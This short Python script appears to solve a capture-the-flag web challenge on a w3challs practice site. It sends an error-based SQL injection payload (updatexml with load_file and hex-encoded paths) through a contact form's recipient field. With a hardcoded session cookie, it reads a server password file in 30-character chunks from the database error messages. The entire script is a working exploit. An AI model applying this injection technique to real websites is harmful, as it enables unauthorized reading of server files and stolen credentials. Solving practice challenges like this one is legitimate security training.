import requests
import re

url = 'http://vip.hax.w3challs.com/index.php?page=contact'
cookie = {'PHPSESSID':'cedrl2a9n4f4r0m0q0ioq6brv9'}
final_text = ''
for i in range(0,100):
	recipient = '1 or updatexml(1,concat(0x7e,substring((select load_file(0x2f686f6d652f76697077656261726d792f7777772f706173732f706173732e747874)),%s,30)),0)' % str(1+i*30)
	#recipient='1 or updatexml(1,concat(0x7e,substring((select load_file(0x2f686f6d652f76697077656261726d792f7777772f56697057656241726d792e706870)),1,30)),0)'
	#print(recipient)

	data = {'recipient':recipient, 'msg':'2'}
	res = requests.post(url = url, cookies = cookie, data = data)
	#print(res.text)

	code = re.compile(r"(?<=XPATH syntax error: '~).*?(?=' -->)", re.DOTALL)
	text = code.findall(res.text)

	print(text[0],end="")
	final_text += text[0]

print(final_text)
